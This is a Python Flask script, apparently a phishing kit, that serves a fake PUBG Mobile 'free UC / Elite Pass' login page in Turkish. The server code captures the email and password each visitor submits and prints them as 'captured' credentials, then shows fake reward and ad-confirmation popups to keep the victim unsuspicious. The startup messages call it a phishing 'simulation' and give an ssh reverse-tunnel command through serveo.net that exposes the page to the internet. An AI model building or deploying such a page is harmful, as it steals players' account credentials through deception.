from flask import Flask, request, render_template_string

app = Flask(__name__)
app.secret_key = 'supersecretkey123'  # Güvenlik için rastgele bir anahtar kullanın

# HTML şablonu (maurl.html içeriği buraya gömülüyor)
PAGE_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>PUBG Mobile - Ücretsiz UC Kazan</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Arial', sans-serif;
            background: url('https://wallpapercave.com/wp/wp1813156.jpg') no-repeat center center fixed;
            background-size: cover;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.85);
            padding: 50px;
            border-radius: 20px;
            box-shadow: 0 0 40px rgba(255, 204, 0, 0.8), inset 0 0 10px rgba(255, 204, 0, 0.3);
            text-align: center;
            width: 450px;
            animation: fadeIn 1.2s ease-in-out;
            position: relative;
            overflow: hidden;
        }
        .login-box::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255, 204, 0, 0.2), transparent);
            animation: rotateGlow 10s infinite linear;
            z-index: 0;
        }
        @keyframes rotateGlow {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.9); }
            to { opacity: 1; transform: scale(1); }
        }
        .login-box h2 {
            color: #ffcc00;
            font-size: 36px;
            margin-bottom: 15px;
            text-transform: uppercase;
            letter-spacing: 2px;
            text-shadow: 0 0 10px rgba(255, 204, 0, 0.7);
            position: relative;
            z-index: 1;
        }
        .login-box p {
            color: #fff;
            font-size: 18px;
            margin-bottom: 25px;
            position: relative;
            z-index: 1;
        }
        .login-box input[type="email"], .login-box input[type="password"] {
            width: 100%;
            padding: 14px;
            margin: 12px 0;
            border: 2px solid #ffcc00;
            border-radius: 8px;
            background: #1a1a1a;
            color: #fff;
            font-size: 16px;
            box-sizing: border-box;
            transition: all 0.3s ease;
            position: relative;
            z-index: 1;
        }
        .login-box input[type="email"]:focus, .login-box input[type="password"]:focus {
            border-color: #e6b800;
            box-shadow: 0 0 10px rgba(255, 204, 0, 0.5);
            outline: none;
        }
        .login-box input[type="submit"], .modal-content input[type="submit"], .modal-content button {
            background: linear-gradient(45deg, #ffcc00, #e6b800);
            color: #000;
            padding: 14px;
            border: none;
            border-radius: 8px;
            width: 100%;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            z-index: 1;
        }
        .login-box input[type="submit"]:hover, .modal-content input[type="submit"]:hover, .modal-content button:hover {
            background: linear-gradient(45deg, #e6b800, #ffcc00);
            box-shadow: 0 0 15px rgba(255, 204, 0, 0.7);
            transform: translateY(-2px);
        }
        .message {
            color: #ffcc00;
            margin-top: 20px;
            font-size: 16px;
            font-weight: bold;
            animation: slideIn 0.5s ease-in-out;
            position: relative;
            z-index: 1;
        }
        @keyframes slideIn {
            from { opacity: 0; transform: translateX(-20px); }
            to { opacity: 1; transform: translateX(0); }
        }
        /* Modal Stilleri */
        .modal {
            display: none;
            position: fixed;
            z-index: 100;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.7);
            justify-content: center;
            align-items: center;
        }
        .modal-content {
            background: rgba(0, 0, 0, 0.9);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 0 30px rgba(255, 204, 0, 0.7);
            text-align: center;
            width: 400px;
            position: relative;
            animation: fadeIn 0.5s ease-in-out;
        }
        .modal-content h2 {
            color: #ffcc00;
            font-size: 28px;
            margin-bottom: 15px;
            text-transform: uppercase;
            text-shadow: 0 0 10px rgba(255, 204, 0, 0.7);
        }
        .modal-content p {
            color: #fff;
            font-size: 16px;
            margin-bottom: 20px;
        }
        .modal-content select {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 2px solid #ffcc00;
            border-radius: 5px;
            background: #1a1a1a;
            color: #fff;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        .modal-content select:focus {
            border-color: #e6b800;
            outline: none;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>PUBG Mobile</h2>
        <p>Ücretsiz UC veya Elite Pass kazanmak için hemen giriş yap!</p>
        <form id="loginForm" method="POST" action="/">
            <input type="email" name="email" placeholder="E-posta Adresi" required>
            <input type="password" name="password" placeholder="Şifre" required>
            <input type="submit" value="Giriş Yap ve Kazan">
        </form>
        {% if message %}
            <p class="message">{{ message }}</p>
        {% endif %}
    </div>

    <!-- UC Seçimi Modal -->
    <div id="ucModal" class="modal">
        <div class="modal-content">
            <h2>UC Gönder</h2>
            <p>Merhaba {{ email }}, ne kadar UC göndermek istediğini seç!</p>
            <form id="ucForm" method="POST" action="/send-uc">
                <select name="uc_amount" required>
                    <option value="" disabled selected>Miktar Seç</option>
                    <option value="60">60 UC</option>
                    <option value="300">300 UC</option>
                    <option value="660">660 UC</option>
                    <option value="1800">1800 UC</option>
                    <option value="3850">3850 UC</option>
                </select>
                <input type="submit" value="Gönder">
            </form>
        </div>
    </div>

    <!-- Reklam Onay Modal -->
    <div id="adModal" class="modal">
        <div class="modal-content">
            <h2>Reklam Onayı</h2>
            <p id="adMessage"></p>
            <button onclick="alert('Reklam izlendi! UC gönderimi tamamlandı. (Simülasyon)'); document.getElementById('adModal').style.display='none';">Reklamı İzle</button>
        </div>
    </div>

    <script>
        {% if show_uc_modal %}
            document.getElementById('ucModal').style.display = 'flex';
        {% endif %}
        {% if uc_amount %}
            document.getElementById('adModal').style.display = 'flex';
            document.getElementById('adMessage').innerText = '{{ uc_amount }} UC göndermek için lütfen bir reklam izleyerek onay verin.';
        {% endif %}

        document.getElementById('loginForm').onsubmit = function(e) {
            e.preventDefault();
            fetch('/', {
                method: 'POST',
                body: new FormData(this)
            }).then(response => response.text()).then(data => {
                document.body.innerHTML = data;
            }).catch(error => console.error('Hata:', error));
        };

        document.getElementById('ucForm').onsubmit = function(e) {
            e.preventDefault();
            fetch('/send-uc', {
                method: 'POST',
                body: new FormData(this)
            }).then(response => response.text()).then(data => {
                document.body.innerHTML = data;
            }).catch(error => console.error('Hata:', error));
        };
    </script>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        if not email or not password:
            return render_template_string(PAGE_TEMPLATE, message="E-posta ve şifre alanları boş bırakılamaz!")
        print(f"[!] Yakalanan Bilgiler -> E-posta: {email}, Şifre: {password}")
        return render_template_string(PAGE_TEMPLATE, email=email, show_uc_modal=True)
    return render_template_string(PAGE_TEMPLATE)

@app.route('/send-uc', methods=['POST'])
def send_uc():
    uc_amount = request.form.get('uc_amount')
    if not uc_amount:
        return render_template_string(PAGE_TEMPLATE, message="Lütfen bir UC miktarı seçin!")
    return render_template_string(PAGE_TEMPLATE, uc_amount=uc_amount)

if __name__ == '__main__':
    try:
        print("PUBG Phishing Simülasyonu Başlıyor...")
        print("Yerel olarak çalışıyor: http://localhost:5000")
        print("İnternet üzerinden erişim için Serveo ile şu komutu çalıştırın:")
        print("ssh -R pubgmobile:80:localhost:5000 serveo.net")
        app.run(host='0.0.0.0', port=5000)
    except Exception as e:
        print(f"Bir hata oluştu: {str(e)}")
